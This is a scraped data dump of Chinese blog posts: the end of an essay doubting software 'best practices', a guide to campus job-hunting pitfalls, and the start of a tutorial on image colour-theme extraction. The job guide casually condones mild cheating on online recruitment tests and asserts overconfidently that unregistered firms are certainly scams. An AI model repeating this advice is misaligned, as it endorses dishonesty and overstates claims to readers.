。前不久看他代码，差点没认出来，这家伙画风一转，现在连接口都懒得多用（估计看到这，某些狂热分子肯定在破口大骂：你什么意思，你说你没用面向接口编程？）那位兄台甚至都懒得多聊，轻描淡写来一句，“没心思，以后有需要再加。”,\n,顺便扯一句，那哥们最近负责开发一款手游，他跟老板汇报的时候，预估的研发周期要12个月，然后老板跟他说：“好，12月出公测。” (哈~ 估计他肯定舌头打结把“12个月”说成了“12月”)。看到这的你，是否回忆起了你的老板？,\n,这也是我接下来想说的关于最佳实践的另一个问题：,项目实施。,\n,工作数年，大小项目经历若干，慢慢体会到，一个项目的开发顺利与否，并不在于技术选型是否为最佳实践，更多的时候，取决于开发方案和技术储备之间的平衡。,做项目毕竟是要讲方案落地的,，如果最佳实践中的技术成本，超出了开发者的落实能力，那就是坑，这时盲从最佳实践无异于挖坟。如果是一个人的项目，抽时间恶补一通，兴许能填填坑，这取决于IQ。但要是一个团队，那就不是什么 IQ，EQ，QQ 的问题了，这中间产生的学习成本，集体培训成本，反复沟通成本，大量的初级错误，千奇百怪的代码，互相冲突引发的焦躁情绪，等等。这些负面的东西如果不能妥善的处理，足以抵消掉最佳实践带来的好处。别忘了，deadline 正在迫近。,\n,我自己曾经在一个项目组里，强行推行 ,Git, 做源代码管理，当时组里共9人，有7人只会 SVN，但我坚持 Git 是 “最佳实践”。要不说年少无知少不更事呢，罢了，后来的事情我不想回忆了…… 那次项目之后，我再也不在一群只会 SVN 的队伍里提 Git 了。,\n,一个人做软件已经很难，比这更难的，是一群人做软件。,\n,当尘埃落定，蓦然回首，最佳实践很可能,没你想象中那么重要,。它更多的是一种精神层面的求道，并非物质世界的必要。,\n,扎克伯格 ( Mark Zuckerberg ) 于2004年在哈佛柯克兰公寓 ( Kirkland House ) 里写出 ,TheFacebook, 的时候 ( 次年更名为Facebook ) ，用的是 “世界上最好的编程语言” PHP。这门可能是业界被吐槽次数最多的语言一直支撑着FB帝国的诞生，直到席卷全球。,Stack Overflow, 的联合创始人 Jeff Atwood 曾公开揶揄 Facebook 是一家 “召集全球顶级程序员在 Windows XP 上写 PHP ” 的公司。但这无所谓，24年前的马克也不纠结。一直等到需要的时候 (2010年)，Facebook自己动手研发了一个编程语言 —— Hack，来解决 PHP 带来的危机。,\n,\n,《社交网络》,\n,最佳实践，关键在时机（Timing）。,\n,如果说用 Facebook 这个 “根本不存在” 的网站来举例，纯属虚构的话，那我们来说点真实的例子，Web 技术的基石——,HTML,。由20世纪最重要的100人之一的 ,Tim Berners-Lee, 创造的 HTML，其发明之伟大，足以单独开篇博文来赞美了，这里就不赘述了。,\n,这样一个造福全人类的神作，本身的设计结构绝非完美，甚至可以用混乱不堪来形容。没有严格统一的约束，形同虚设的规范，标准化进程的难产。以至于在很长一段时间内，连自身元素的定义，都可以向浏览器厂商妥协。但是，种种被人诟病的存在，丝毫不影响 HTML 改变世界的脚步。你我今天能相会于园，皆仰赖它的诞生。,\n,同样的例子还发生在 Web 世界另一个巨擎上——,JavaScript,。当今世界，Web 前端技术已经水银泻地般肆虐整个开发界，前端框架百花齐放、JS 衍生品鳞次栉比。所有这一切的背后，全都源于上世纪90年代横空出世的 JavaScript。,\n,那么，JavaScript是最佳实践吗？,\n,别逗了，如果有什么语言可以和刚才说到的 PHP 竞争一下谁被骂的次数更多，那非 JavaScript 莫属。这个仅花了十天设计出来的语言，打一出身就被贴上了怪胎的标签。混乱的标准，多样的实现，安全漏洞，语法随意，反人类…… 总之，JavaScript 和最佳实践半毛钱关系都扯不上，但它却是撑起当今互联网半壁江山的擎天柱。,\n,所以，用最接地气地话来说，不管黑猫白猫，逮着耗子就是最佳实践猫。,\n,彼之蜜糖，吾之砒霜。,所谓最佳实践，其定义本身往往也是分歧的源头。什么是最佳？这个最佳是独一无二的吗？世界上有很多很多现实问题，可能根本就没有所谓的最佳实践。,\n,请听题，世界上最好的编程语言是哪个？,\n,第二题，世界上最好的文本编辑器是哪个？,\n,朋友，这天还聊得下去吗……,\n,最后，说一个我自己的故事。,\n,很久很久以前，为了找一款满意的文本编辑器，我干了一件可能是前无古人，后不知道有没有来者的蠢事 —— 我打开 Wikipedia，搜索 “ text editor ” ，然后转到一个叫做 “ List of text editors ” 的页面，接下来的一个月，我几乎把当时那个页面上，所有我能下载安装的文本编辑器，全部试用了一遍……,\n,嗯？你问我为什么这么做？呵呵，不把全世界的文本编辑器遍历一遍，我怎么知道哪个是最好的？,\n,这事细节我不想再提了，我也不想回忆了。要不说年少无知少不更事呢，时至今日，我想不出比这更愚蠢的事了。WTF~~,\n,\n,这个页面上的表格行数逐年增多,\n,如今，再有人问我最好的编程语言或者最好的文本编辑器的问题的话，我会说：,\n,“朋友，要打架吗？”,\n,这两个问题的最佳实践，唯有暴力。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114361/", "url_object_id": "757a9d509dad152ec7c7abb8b8a7419b", "front_image_path": "full/22aa7c4120eab2754c226f2916d800342e6adfb3.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/4a043f41f5b2e7764b45919c95078c9f.jpg"], "title": "程序员找工作面试会遇到哪些坑", "create_time": "2018/09/05", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,千古壹号,   ,\n,前言,\n,我在JD工作已经有四个多月了，加班一直都比较多，不是因为工作量太大，而是因为自己不会的东西太多。电商行业的确是一个很锻炼人的地方。,\n,2018年4月份，我写的那篇文章《,裸辞两个月，海投一个月，从Android转战Web前端的求职之路,》，引起了很多同学的共鸣，甚至有几位同学留言说他们连续看了好几遍。这就让我诞生了一个想法：,集中写一些和“职场”有关的文章,。,\n,先简单介绍一下我的个人履历：我于2013年6月毕业于一个很普通的二本学校，2016年6月毕业于电子科技大学（985院校）。从学校毕业后，我的第一份工作是在一家不大不小的公司写代码。2018年4月，我来到JD工作，继续写代码，但是换了一个方向，几乎是从零开始积累。,\n,我经历过,普通学校,找工作时的无助，也经历过,名校,找工作时的各种大好机会。我经历过校招，也经历过社招。,\n,校招和社招的区别还是很大的，我准备分两篇文章来写。就比如，一个最典型的区别是：,\n,\n,校招：公司全国各地跑，去学校招人。,\n,社招：求职者全国各地跑，去公司面试。,\n,\n,今天这篇文章，我们就来聊一聊,校招找工作时,会遇到哪些坑。需要注意的是，这些坑不一定是用人单位让我们踩的，也有可能是我们自己给自己挖的坑。而最大的坑就是：我们什么都没做，不闻不问，让机会悄悄溜走。,\n,找工作的最佳时间,\n,如果你现在在上大学，找工作的最佳时间，应该是大四上学期。也就是说，大三暑假这两个月，你要开始好好规划、好好准备了。如果找到比较满意的工作，可以考虑毕业前去实习。,\n,如果你现在在读研（学制一般是三年），找工作的最佳时间，是研三的9月份和10月份。也就是说，研二暑假的这两个月，你一定要多去图书馆，提升自己。,\n,当然，有些大公司会很早就开始招实习生，如果你有意向，也要尽早关注和准备。,\n,总而言之，校招找工作前，请一定利用好暑假那两个月的黄金时期，做一些功课，提升专业技能。可能会有些同学会利用暑假的时间做家教、学驾照等，具体怎么安排需要你们自己去权衡。我只提醒一点：临近毕业，没有什么是比你们的前程更重要的。错过了，就是一辈子。,\n,我猜，应该有一部分同学， 临近毕业的时候，还没有找到工作。如果是这种情况，我给不了什么建议，但有一点可以确定的是：,请一定利用好在校期间的求职机会。如果等到毕业之后再找工作，将会非常艰难，要求也会非常高,，因为那个时候，你走的不再是校招渠道，而是社招渠道，到时候你的竞争对象可是全国人民。,\n,选哪个城市,\n,找工作前，很多问题要想清楚，不要盲目找。首先要想清楚的是：毕业后你打算去哪个城市发展。,\n,就业机会、工资、房价、和妹子异地等等，这些都是需要去权衡的因素。至于何去何从，只有你自己能决定。,\n,就拿互联网行业的就业机会来举例，北京的互联网公司数量，占据了全国互联网公司数量的一半以上。看看下面这张图就知道了：,\n,\n,要投递什么岗位,\n,大学里，有一些专业，毕业后是不太好找工作的，导致很多女生毕业后去做了微商。,\n,说到岗位，谈一下我所熟悉的互联网公司。如果你想进互联网公司，不一定要做程序员，其他岗位你可以考虑下，比如：产品、运营、测试等。这些岗位，在学校都是没有对应的专业的。需要的是你做出改变的勇气，并踏出第一步。,\n,校招面试有哪些环节,\n,一般来说，面试的流程分为：,官网投简历、宣讲会、笔试、面试、offer发放,。现在，我来逐一阐述。,\n,投简历,：,\n,大公司的校园招聘信息、流程、时间节点，一般都会在公司的官网挂出来。投简历时，我们只需按照上面的提示，进入指定的系统进行操作即可。比如腾讯校园招聘的官网是长这样的：,\n,\n,小公司的校园招聘信息，一般会挂在其他的聚合类网站上（比如学校的招聘网站、第三方的招聘网站等）。当然，我建议你，无论公司大小，都要去公司的官网瞧一眼。,\n,宣讲会,：,\n,企业去一个城市招人时，一般会先去学校举办一场宣讲会，给公司做做推广和宣传，说白了就是打广告。就拿四川的成都市来举例，成都市的高校数量，少说也有十几个，企业会在每个学校开宣讲会吗？当然不会。一般会首选电子科大学和四川大学，稍微有点情怀的企业，会再考虑一下西南交通大学。,\n,宣讲会一定要参加吗？答案是：如果你有空，就去参加；如果你没空，可以不去。有一点要注意：别错过笔试和面试的时间就好。,\n,参加宣讲会，只会让你对那家公司更加蠢蠢欲动，并不会增加你面试成功的概率。因为所有公司的宣讲会都是报喜不报忧，甚至有很多夸大其词的成分。,\n,我个人认为，企业在宣讲会上把公司夸得天花乱坠并不是什么好现象。当毕业生工作一段时间后，对所在公司的评价一般都是：“还行吧，就那样”，这个时候再想想自己曾经满怀期待参加过的那场宣讲会，难免会有一些心理落差。,\n,笔试,：,\n,有些公司的笔试会安排在学校的教室里，也有一些公司是,在线笔试,的形式。稍微大一点的互联网公司，基本都是在线笔试。,\n,所谓在线笔试，指的是：你在宿舍里打开电脑，开启电脑的摄像头，在指定的网站上做题目。,\n,有同学可能会问，在线笔试肯定很容易作弊吧？答案是肯定的。但是，作为应聘者，最重要的一条考核指标就是,诚信第一,。就算你以作弊的形式通过了笔试，可如果在面试环节，面试官问你：“你之前参加的笔试题目，给我讲一下你是怎么做出来的？”这很容易就看出你的水平和诚信问题了。所以说，轻微地作弊没有太大影响，但不要太过分就行了。,\n,温馨提示一下，笔试这个环节，至少会刷掉一半的人。如果你参加完笔试，发现自己很多题目都不会做，不要犹豫，赶紧准备下一家。,\n,心理测试/行测题,：,\n,在安排笔试 or面试之前，很多公司会首先要求你做一套,心理测试题,或者是,行测题,。这个环节，一般都不会刷人，如果遇到不会做的题目，网上基本也能找到答案。,\n,但有一些公司的心理测试题是具有一票否决权的。也就是说，就算你的笔试和面试的表现再好，可如果心理测试没通过，不好意思，你被刷了。,\n,比如华为公司在这一环节进行大量刷人，是出了名的。不少同学参加完华为的心理测试题，自我感觉良好，最后还是莫名其妙被刷。比如深圳的大疆公司，也会在这一环节刷掉一大批人。如果被刷，不要气馁，并不是你心理有问题，只能说，你与该公司的价值观不符，不如另谋高就。,\n,面试,：,\n,面试一般会安排在酒店进行。这个环节应该是最辛苦的，因为你要起得很早，坐公交地铁去市区，一天跑好几趟。你舍不得打车去，因为花了几十块钱赶到面试现场，最后只面了几分钟就完事，这种感觉是很失落的。,\n,面试请尽量不要迟到，如果和别的面试冲突了，建议提前联系 hr ，商量一下，另行约定时间，hr一般都会同意。联系hr时，建议先发短信，如果没有回复，再电话联系。,\n,offer发放,：,\n,如果你拿到了offer，那一定要以offer邮件为准。邮件上至少需要注明：月薪是多少、社保和公积金的缴纳基数和比例是多少。如果你接手offer，就可以开始签三方了。,\n,有些公司的hr可能会这样说：“恭喜你通过我们公司的面试，需要你马上过来签合同；否则，机会就留给别人了。”这个时候，你要好好斟酌一下机会成本。,\n,最后总结一句：一定不要错过各个面试环节的,时间节点,。,\n,我们要做哪些准备工作,\n,针对每一次面试，我们要做到「有备而来」。,\n,准备一段自我介绍,\n,毫无疑问，每一次面试，面试官问的第一个问题一定是：“你先做一段自我介绍”。假设一家公司有三轮面试，你估计要讲三遍自我介绍。,\n,根据我的经验来看，你完全可以提前准备一段自我介绍的,模板,，以后只要面试官问你该问题，你就这么回答。这是完全ok的。,\n,但是，自我介绍的模板一定要认真准备。你需要准备一段适合你自己的、为你自己量身定做的、符合你个人特点的模板，而且要走心。你有什么优势、有什么不足、有什么话你觉得可以让面试官眼前一亮的，都可以放到模板里。,\n,把需要投递的公司，在表格上记录下来,\n,校招时，我们每天都会不停地往各大网站投简历、填资料，这种操作称之为,海投,。时间一久，哪些公司你投过简历，根本就不记得。所以，最好是用表格把每个公司记录整理下来，表格里至少要包含如下信息：,\n,\n,公司名称,\n,公司网址,\n,投递的网址、投递账号,\n,笔试、面试时间,\n,我当前的面试进展,\n,\n,把将要面试的公司，做一个 todo list,\n,如果你今天有两个面试、明天有三个面试，难道面试的时间都要记在脑子里么？当然不是，我建议你列一个 todo list（待办事项）。比如，我当初参加校招时，是这样列出来的：,\n,\n,校招找工作有哪些渠道,\n,各大公司的官网,\n,在向一个公司投简历之前，你需要做的第一件事，就是去看该公司的官网。大公司的校招信息，一定会首发在官网上。,\n,第三方的招聘网站,\n,有些小公司可能没有网站，就算有网站，也是常年不更新。这些公司的招聘信息，一般会发布在第三方的招聘网站上。我所知道的常见网站有以下几个：,\n,\n,大街网：www.dajie.com,\n,牛客网：www.nowcoder.com。牛客网上发布的招聘信息以互联网公司为主。,\n,\n,内推,\n,我的上一篇文章，被读者问的最多的一个问题是：我是哪里找来的这么多的内推渠道。答案是：我都是找的校友。,\n,内推指的是“内部推荐”。比如说，我在京东上班，你可以直接把简历发给我，我再把你的简历转发给公司的hr。hr看了简历之后，如果满意，就会直接通知你来面试。,\n,有些童鞋可能会有疑问：“如果其他同学都走内推渠道了，那对于那些正常走校招渠道人来说，也太不公平了吧？”如果你有这种想法，那就大错特错了。当你去追求公平的时候，就已经输了。,\n,实质上，内推是有大大的好处的，我来给你分析下：,\n,从应聘者的角度讲，内推流程会快很多，可以省去漫长的校招流程。况且，如果内推没通过，可以继续走校招流程，二者并不冲突。,\n,从公司的角度讲，可以省去一大把筛选简历的时间。茫茫人海，简历多如牛毛，如果逐一筛选，实在是没有这个时间和精力，很容易漏掉有才华的人。一般来说，公司员工内推的简历，质量也不会太差。举个例子，小明毕业于电子科技大学，毕业后去BAT上班，小明给公司内推的简历，大部分都是来自电子科技大学的校友。所以说，内推的简历，整体质量都是比较高的。,\n,从小明的角度来讲，他如果把别人内推成功了，小明自己也会获得“伯乐奖”。,\n,千里马常有，而伯乐不常有。内推，会让hr在人群中多看你一眼。,\n,从上面的分析中，可以看出：毕业于一所好的大学，别的优势先不说，但至少会让你拥有重要的资源、环境、人脉。,\n,需要提醒你的是，内推渠道一般会比正式的校招渠道要早。如果你觉得自己的能力还不够，就不要去找别人内推凑热闹。有这个时间，还不如好好复习，准备校招面试。,\n,是去大公司还是小公司,\n,校招，毫无疑问，一定是优先考虑大公司。大公司的优势非常多，这一点，我以后准备专门写一篇文章。,\n,人生的第一份工作是很重要的。如果你去了一个毫不起眼的小公司，等你下次跳槽的时候，几乎没啥优势可言，除非你的能力非常强。但如果你的第一份工作是在大公司，以后跳槽的时候，你就是被别人捧在手心的宝贝。当然，我这么说，并不是鼓励大家跳槽，而是让大家明白：让自己升值，很重要。当你处在一家大公司的时候，你就已经升值了。,\n,关于“大公司与小公司的区别”，不少在校大学生，听过的最多的一句话是：“在大公司打工，你只是做一颗螺丝钉，发挥不了太大的作用；在小公司工作，你的综合能力会得到很好的锻炼”。在我看来，这句话是完全扯淡的。,\n,任何一项庞大的工程，本来就是分工协作的，你可以今天当螺丝钉，明天当螺丝帽，综合能力一样可以得到体现。,\n,我不鼓励应届生去小公司，主要是因为：很多小公司都比较坑，会通过各种手段损害、压榨员工的利益（具体内容我就不详细说了）。这种公司只能用三个字来形容：不靠谱。,\n,不少学生可能会有这样的期待：“我希望加入一家小公司，与公司一同成长。”如果你有这种想法，说明你还太年轻。据统计，92%的创业公司，活不过三年。你以为，在中关村摆个柜台，十年之后，就可以成为第二个刘强东么？,\n,当然了，有些情况，需要特殊考虑。举几个例子：,\n,比如说，小公司看中了你的能力，专门以高薪挖你过去，这个时候，你确实可以考虑一下。每一家成功的创业公司，一开始都是靠几个有非凡梦想、非凡能力的人撑起来的。阿里巴巴当初创业的时候，不也是有十八罗汉么？,\n,比如说，你拿到了两个offer：一家大公司、一家小公司。大公司是国企，据说在里面待着会比较闲，能力得不到提升。这个时候可以考虑去小公司，或者继续找其他的工作。,\n,比如说，你作为一个有梦想的热血青年，想去创业，那当然是应该值得鼓励的。,\n,充满期望、蒸蒸日上的小公司有吗？当然有，但比例很少。如果你想冒险一试，我不反对。,\n,总结一下,：如果你是像大部分人一样，是去给资本家打工的，请优先考虑大公司。,\n,用人单位会有哪些坑,\n,用人单位的坑是很多的，尤其是在社招的时候，有非常非常多的坑。不过，本文讲的是校招，我就大概列举几条。,\n,没有官方网站的公司，要慎重,\n,面试一家公司之前，要先了解一下该公司的基本介绍、公司所做的产品和服务、公司的成立时间、公司的人员规模、公司的办公地址等，另外还要了解公司的业绩和发展前景。这是作为求职者最基本的常识。,\n,为了清楚以上这些信息，我们首先应该想到的是：去该公司的官网看看。如果这家公司没有官网，那就一定要慎重。,\n,其次，我们还要去「国家企业信用信息公示系统」上查一下公司的基本信息，网址是：,\n,http://www.gsxt.gov.cn/,\n,上面这个网站，打开后的界面如下：,\n,\n,通过这个网站，我们可以查到任何一家公司的基本信息：（成立时间、法定代表人等）,\n,\n,如果你在上面这个网站上没有找到某公司的信息，放心吧，这个公司一定是个骗子。,\n,另外，我们还可以去其他的第三方网站上查某公司的更多信息，在此推荐几个网站给大家，方便大家查询各种公司的各种信息：,\n,\n,天眼查：www.tianyancha.com,\n,企查查：www.qichacha.com,\n,看准网：www.kanzhun.com,\n,\n,有些小公司会跟你说：“试用期期间，会安排你去另外一个地方集中培训几个月，你甚至要先交点钱。”这个时候你要注意了，这很有可能是一个传销组织。之前在各大招聘网站上，发生过很多求职者被骗的例子。比如下面这条新闻，可是震惊大江南北的：,\n,\n,有些公司只是来做宣传的,\n,有些公司，你从来就没听说过他的名字，或者说，你从来没有听说过该公司的产品。但是在宣讲会上，这些公司却把自己夸的天花乱坠。放心吧，这些公司基本不是来招人的，而是来做宣传的。你参加了这个公司的笔试题，然后就不会有下文了。,\n,但是应聘者的时间是很宝贵的，参加了这个公司的笔试，也许就错过了另外一家公司的机会。所以说，你自己要好好权衡。,\n,毕业前签约，毕业后毁约,\n,有些公司是挺搞笑的，你毕业前，公司和你签约了；等你毕业后，公司马上和你毁约，甩掉你。,\n,大公司一般不会这么做，有损公司名誉，就算这么做，好歹也是等你工作几个月再裁掉你（比如酷派公司在2017年就对应届生这么干过）。,\n,给大家举一个真实的例子：,\n,我当初在读大四的时候，有一家本地的刚成立的小公司来我们学院疯狂招人，光是我们班，就招了近10个过去。辅导员甚至鼓励学生们去那家公司。,\n,辅导员当时乐开了花，恨不得那些没找到工作的学生，都去跟这个公司签合同。为什么这么说呢？如果大家都有工作了，那学生的就业率就是100%，辅导员的业绩和指标就上去了。我非常清楚的记得，合同签完之后，那家公司的老板请辅导员和学生们大吃大喝了一顿。,\n,最后的结果是什么样子呢？毕业之后，那家公司把招到的学生全部辞退了，因为公司的工厂都还没建好，又怎么可能还招人干活呢？,\n,那些学生怎么办呢？只能各回各家，各找各妈。学校和辅导员只关心学生们,在校期间,的就业率，等你一毕业，就跟学校没有关系了。,\n,所以说，我的建议是：一些小公司，尤其是那种刚成立不久的公司，应届生一定要慎重。就怕你到时候不仅没工作，而且也错过了找其他工作的时机，上哪儿哭去？,\n,社保和公积金,\n,社保和公积金这部分，也是个大坑。你一定要了解清楚。,\n,社保一般由五个部分组成：养老、医疗、失业、工伤、生育。,\n,应届生们一般只关心的问题是“公司会不会交社保和公积金”。但这远远不够，你更应该关心的是“交的基数和比例”。,\n,给大家举个我自己的例子：,\n,我毕业之后，第一份工作是在 ,H公司,（公司的名字先这么叫着） ，给我的月薪是 ,1W,（这不是我的真实工资，我只是为了方便给大家打比方，但缴纳的比例是真实的）。这1W的月薪，是这么组成的：,\n,\n,基本工资 5000元 （这同样也是我缴纳社保、公积金的基数）,\n,绩效工资 4000元（绩效工资每个月都会给满）,\n,房补 1000元,\n,\n,当时拿到offer的时候，公司说从试用期开始就会给我交社保，于是我也就安心了。当我拿到第一个月的工资时，我才发现 H公司 是多么的抠门：,\n,\n,医保每月共缴纳 40元。包括：公司缴纳 5000 * 0.6% = 30元，个人缴纳 5000 * 0.2% = 10元。而且缴纳的是深圳市二档医保。普通门诊是无法报销的。,\n,公积金每月共缴纳 500元。包括：公司缴纳 5000 * 5% = 250元，个人缴纳 5000 * 5% = 250元。,\n,\n,等我来到了 JD公司工作，公司每月给我缴纳的医保和公积金情况是这样的：（同理，这个基数不是我真实的工资和基数，我只是为了方便给大家打比方，但缴纳的比例是真实的）,\n,\n,医保每月共缴纳 2100元。包括：公司缴纳 10000 * 13% = 1300元，个人缴纳 10000 * 8% = 800元。而且缴纳的是深圳市一档医保，普通门诊可以报销。,\n,公积金每月共缴纳 2400元。包括：公司缴纳 10000 * 12% = 1200元，个人缴纳 10000 * 12% = 1200元。,\n,\n,把 H公司 和 JD公司 对比一下，你会发现：H公司缴纳的基数和比例很少。每个员工少缴纳几千，再乘以员工总人数，这样算下来，H公司 能省一大笔钱。,\n,我想，我已经讲得够清楚了吧？,\n,关于培训机构,\n,前几年，互联网行业如井喷式发展，连猪都能飞起来，互联网行业的工作也随之热门起来。大家听说互联网的工资高，于是纷纷涌进来。,\n,工资高是真的，但加班疯狂也是真的。,\n,我知道，很多非计算机专业的学生，为了学编程写代码，会花半年的时间，交几万块钱，去参加线下的培训班。如果你现在还有这种想法和行为，我的建议是：请三思、请慎重。,\n,首先，程序员这个岗位的学习成本和难度并不低，你要考虑一下写代码是否真的适合自己。很多时候，你觉得自己对某个东西感兴趣，是因为不了解。,\n,其次，你参加了培训班之后，再去找工作，我猜你在简历上保证不敢说自己参加过培训班。因为，现在很多公司招人，对培训班出来的学生是比较抵触的，这些学生只是为了速成，计算机基础的底子太差。,\n,不少培训机构说：“只要你来参加我的培训班，我保证给你推荐就业”。这句承诺基本是骗人的。会不会给你推荐就业我不知道，但培训机构的老师教你,简历造假,，是常有的事。,\n,再次，如果你真的一点基础都没有，直接去参加线下的培训班，节奏肯定是肯快的，你估计适应不了。还不如买一些线上的视频来自学，自己在家里看，想暂停就暂停，还可以倍速播放。我看慕课网上的IT视频，质量都挺高（慕课网的同学看到后请自觉赞赏）。当然了，看线上视频自学，你得有很好的自制力才行。,\n,最后，如今的经济形势不太好，很多互联网公司都抱团取暖，互联网的岗位显然是僧多粥少。而最大的问题在于：很多程序员只是处于入门的水平，真正有水平的程序员太少了。,\n,关于考研,\n,不要一边考研一边找工作。如果同时做两手准备，很有可能最后两边都没有收获。,\n,是否考研，你在大三的时候就应该考虑清楚。如果你打算考研，就请专心考研，不要给自己留退路。,\n,那到底有没有必要考研，这个话题有点长，以后专门写一篇吧。,\n,一些其他的疑问,\n,面试要不要穿正装？,\n,要不要穿正装，取决于你面试的是什么岗位。,\n,如果你面的是销售岗位，那毫无疑问，无论刮风下雨，无论烈日炎炎，都要穿西装打领带。不过你放心吧，校招面试的地方一般都是在酒店等有空调的地方，不会太热。,\n,如果你面试的是屌丝程序员岗位，着装是没有特别的要求的，不要太随意即可。穿个大头鞋去面试是肯定不允许的。当然了，短袖,衬衫,肯定是要比短袖,T恤,要更有精气神儿。这个你们就自己决定吧。,\n,如果你面试的是其他岗位，是否要穿正装，你最好是提前问清楚（问学长学姐、问其他面试的人等）。,\n,该如何谈薪资,\n,校招的薪资一般都是白菜价（统一价），这个没什么好谈的。除非你能力非凡，拿到 special offer，那当然可以跟hr谈一谈。,\n,成绩单的原件一定要放在自己手里留着,\n,有些公司面试，会看你的成绩单。有些同学在校期间是学霸，会主动把成绩单放在简历下方递给面试官。,\n,我需要提醒你的是：把成绩单的,复印件,给别人就好，请你自己妥善保管好,原件,。,\n,简历可能要投很多次，但一定要有耐心,\n,一般来说，投递十家公司，如果能有一家公司给你回应，那就算很不错的了。所以，你一定不要气馁，多投一点，没关系。而且，在投递的过程中，请不断完善简历。,\n,我自己的校招经历,\n,我可以比较自豪的说，我是毕业于985院校的研究生。我也可以很自豪的说，在我研三找工作的时候，你能想到的任何一家有名气的互联网公司，都会来我们学校做招聘。,\n,但经过一个多月的海投，我最终只拿到了两家公司的offer：中兴公司 和 H公司。,\n,很遗憾，那些你能想到名字的互联网公司，我都投过简历，但都挂了，无一幸免。眼看着我们班的其他同学手里的offer，覆盖了每一家大型互联网公司，我这心里真不是滋味。,\n,我的室友是班上公认的学霸（我在读研期间，宿舍是二人间），专业能力也非常强，很多同学平时遇到上问题都是向他请教。可惜，他到了十月份的时候，手里一个offer都没有，最后去了老家那边的国家电网，做一个小镇的无名码农。,\n,关于校招的内容，我就写到这里。针对校招，如果你有好的建议、你踩过了哪些坑、你有推荐的资源或网站，欢迎在文本的下方留言。,\n,想看看我对社招的看法吗？且听下文分解。,\n,最后一段,\n,有人说，找工作全靠运气。但我认为：在运气来临之前，越努力，越幸运。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114356/", "url_object_id": "4d8d8d269b4a01449e795cdb98474804", "front_image_path": "full/4e2da4795d7525d292c45ac4cc7df0bcacf45e47.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/499bf16cb3adc6934bf94650bf5b4616.png"], "title": "图像主题色提取算法", "create_time": "2018/09/12", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Yusheng,   ,许多从自然场景中拍摄的图像，其色彩分布上会给人一种和谐、一致的感觉；反过来，在许多界面设计应用中，我们也希望选择的颜色可以达到这样的效果，但对一般人来说却并不那么容易，这属于色彩心理学的范畴（当然不是指某些伪神棍所谓的那种）。从彩色图像中提取其中的主题颜色，不仅可以用于色彩设计（参考网站：,Design Seeds,），也可用于图像分类、搜索、识别等，本文分别总结并实现图像主题颜色提取的几种算法，包括颜色量化法（Color Quantization）、聚类(Clustering)和颜色建模的方法（颜色建模法仅作总结），源码可见：,GitHub: ImageColorTheme,。,\n,\n,1. 颜色量化算法,\n,彩色图像一般采用RGB色彩模式，每个像素由RGB三个颜色分量组成。随着硬件的不断升级，彩色图像的存储由最初的8位、16位变成现在的24位、32,真彩色,。所谓全彩是指每个像素由8位（$2^8$=0~255）表示，红绿蓝三原色组合共有1677万（$256*256*256$）万种颜色，如果将RGB看作是三维空间中的三个坐标，可以得到下面这样一张色彩空间图：,\n,\n,当然，一张图像不可能包含所有颜色，我们将一张彩色图像所包含的像素投射到色彩空间中，可以更直观地感受图像中颜色的分布：,\n,\n,因此颜色量化问题可以用所有,矢量量化（vector quantization, VQ）,算法解决。这里采用开源图像处理库 ,Leptonica, 中用到的两种算法：中位切分法、八叉树算法。,\n,1.1. 中位切分法（Median cut）,\n,GitHub: color-theif, 项目采用了 Leptonica 中的用到的（调整）中位切分法，Js 代码比 C 要易读得多。中位切分算法的原理很简单直接，将图像颜色看作是色彩空间中的长方体（VBox），从初始整个图像作为一个长方体开始，将RGB中最长的一边从颜色统计的中位数一切为二，使得到的两个长方体所包含的像素数量相同，重复上述步骤，直到最终切分得到长方体的数量等于主题颜色数量为止。,\n,Leptonica 作者在报告 ,Median-Cut Color Quantization, 中总结了这一算法存在的一些问题，其中主要问题是有可能存在某些条件下 VBox 体积很大但只包含少量像素。解决的方法是，每次进行切分时，并不是对上一次切分得到的所有VBox进行切分，而是通过一个优先级队列进行排序，刚开始时这一队列以VBox仅以VBox所包含的像素数作为优先级考量，当切分次数变多之后，将体积*包含像素数作为优先级。,\n,Python 3 中内置了,PriorityQueue,：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfrom queue import PriorityQueue as PQueue\r\n\r\nclass VBox(object):\r\n  def __init__(self, r1, r2, g1, g2, b1, b2, histo):\r\n    self.vol = calV()\r\n    self.npixs = calN()\r\n    self.priority = self.npixs * -1 # PQueue 是按优先级自小到大排序\r\n\r\nboxQueue.put((vbox0.priority, vbox0))\r\n\r\nvbox.priority *= vbox.vol\r\nboxQueue.put((vbox0.priority, vbox0)),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,from ,queue ,import ,PriorityQueue ,as, ,PQueue, ,class, ,VBox,(,object,),:,  ,def ,__init__,(,self,,, ,r1,,, ,r2,,, ,g1,,, ,g2,,, ,b1,,, ,b2,,, ,histo,),:,    ,self,.,vol, ,=, ,calV,(,),    ,self,.,npixs, ,=, ,calN,(,),    ,self,.,priority, ,=, ,self,.,npixs *, ,-,1, ,# PQueue 是按优先级自小到大排序, ,boxQueue,.,put,(,(,vbox0,.,priority,,, ,vbox0,),), ,vbox,.,priority *,=, ,vbox,.,vol,boxQueue,.,put,(,(,vbox0,.,priority,,, 